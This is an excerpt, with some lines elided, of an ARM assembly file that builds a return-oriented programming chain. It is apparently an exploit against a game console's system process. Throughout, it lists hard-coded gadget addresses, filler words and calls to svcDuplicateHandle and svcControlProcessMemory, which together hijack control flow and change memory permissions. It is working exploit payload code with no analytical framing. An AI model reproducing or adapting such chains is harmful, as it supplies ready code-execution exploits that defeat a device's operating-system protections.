...
.create "ro_initial_rop.bin",0x0
	...
	.word 0x14001050 ; pop {r4, r5, r6, r7, pc}
		; initial return; loads up garbage into registers and moves on
		; (this is used by makeROP.py)
	.word 0x14000C94 ; pop	{r4, lr} | b 0x140012B4 | mov r0, #0x3000000 | fmxr fpcsr, r0 | bx lr
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0x14005dc0 ; lr = pop {pc}
	; equivalent to .word 0x14005dc0 ; pop {pc}

	.word 0x14005dc0 ; pop {pc} (NOP)
	.word 0x14005dc0 ; pop {pc} (NOP)
	.word 0x14005dc0 ; pop {pc} (NOP)
	.word 0x14005dc0 ; pop {pc} (NOP)
	.word 0x14005dc0 ; pop {pc} (NOP)
...
.orga RO_SPIDERHANDLE_LOCATION-(RO_ROP_START+RO_ROP_OFFSET)
	...
	.word 0x140020C8 ; svcDuplicateHandle (ends in BX LR)
	...
	.word 0x14000f3c ; ldr r0, [r4, #4] | pop {r4, r5, r6, pc}
		.word 0xDEADC0DE ; r4 (garbage)
	...
	.word 0x14004D00 ; svcControlProcessMemory | LDMFD SP!, {R4,R5} | BX LR (pop {pc})
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0xDEADC0DE ; r5 (garbage)
